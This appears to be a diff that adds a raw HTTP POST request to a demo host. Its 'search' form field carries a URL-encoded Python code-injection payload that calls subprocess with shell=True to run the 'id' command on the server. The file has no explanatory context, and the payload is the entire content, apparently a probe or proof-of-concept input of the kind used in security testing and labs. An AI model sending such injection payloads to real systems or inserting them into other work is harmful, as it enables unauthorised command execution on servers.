@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 55
+Connection: close
+
+search=y%3Dsubprocess.call%28%27id%27%2Cshell%3DTrue%29
